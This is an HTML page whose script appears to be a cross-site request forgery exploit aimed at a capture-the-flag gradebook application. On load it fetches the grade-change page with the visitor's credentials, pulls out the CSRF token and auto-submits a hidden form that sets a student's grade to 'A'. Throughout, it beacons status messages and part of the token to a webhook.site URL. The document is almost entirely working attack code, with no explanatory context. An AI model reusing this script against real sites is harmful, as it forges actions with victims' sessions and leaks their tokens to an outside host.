<!DOCTYPE html>
<html>
<head>
    <title>Grade Update System</title>
</head>
<body>
    <h2>Grade Update Portal</h2>
    <div id="status">Initializing grade change system...</div>
    
    <script>
    // Send initial ping to webhook
    (new Image()).src = 'https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?status=loaded&time=' + Date.now();

    const YOUR_STUDENT_ID = 'cec61aee-395d-4281-af96-cfe05bda466e';
    const TARGET_CLASS_ID = 'e522382b-7643-469c-ae52-ba488f5752c6';

    const statusEl = document.getElementById('status');

    function updateStatus(message) {
        statusEl.textContent = message;
        console.log(message);
        (new Image()).src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?msg=${encodeURIComponent(message)}`;
    }

    async function changeGrade() {
        try {
            updateStatus('Step 1: Fetching CSRF token...');
            
            // 1. First, load the grade-change page in a hidden iframe to get CSRF token
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'https://gradebook-app.ctf.csaw.io/grade-change';
            document.body.appendChild(iframe);
            
            // Wait for iframe to load
            await new Promise((resolve) => {
                iframe.onload = resolve;
                setTimeout(resolve, 3000);
            });
            
            updateStatus('Step 2: Extracting CSRF token...');
            
            // 2. Extract CSRF token from the iframe
            let csrfToken = null;
            try {
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                const csrfInput = iframeDoc.querySelector('input[name="csrf_token"]');
                if (csrfInput) {
                    csrfToken = csrfInput.value;
                    updateStatus('CSRF token found: ' + csrfToken.substring(0, 20) + '...');
                }
            } catch (e) {
                updateStatus('Cannot access iframe content directly due to same-origin policy');
                // Fallback: use fetch to get the page content
            }
            
            if (!csrfToken) {
                // Alternative method: use fetch to get CSRF token
                updateStatus('Step 2b: Fetching CSRF token via API...');
                try {
                    const response = await fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
                        credentials: 'include'
                    });
                    const html = await response.text();
                    
                    // Parse HTML to extract CSRF token
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(html, 'text/html');
                    const csrfInput = doc.querySelector('input[name="csrf_token"]');
                    if (csrfInput) {
                        csrfToken = csrfInput.value;
                        updateStatus('CSRF token via fetch: ' + csrfToken.substring(0, 20) + '...');
                    }
                } catch (fetchError) {
                    updateStatus('Fetch failed: ' + fetchError.message);
                }
            }
            
            if (!csrfToken) {
                throw new Error('Could not obtain CSRF token');
            }
            
            // 3. Submit the grade change form with CSRF token
            updateStatus('Step 3: Submitting grade change...');
            
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'https://gradebook-app.ctf.csaw.io/grade-change';
            form.style.display = 'none';
            
            const formData = {
                'student_id': YOUR_STUDENT_ID,
                'class_id': TARGET_CLASS_ID,
                'grade': 'A',
                'csrf_token': csrfToken
            };
            
            for (const [name, value] of Object.entries(formData)) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = value;
                form.appendChild(input);
            }
            
            document.body.appendChild(form);
            form.submit();
            document.body.removeChild(form);
            
            updateStatus('SUCCESS: Grade change form submitted!');
            (new Image()).src = 'https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?status=form_submitted';
            
        } catch (error) {
            updateStatus('ERROR: ' + error.message);
            (new Image()).src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?error=${encodeURIComponent(error.message)}`;
        }
    }

    // Start the process
    updateStatus('Starting grade change process...');
    setTimeout(changeGrade, 1000);
    </script>
</body>
</html>
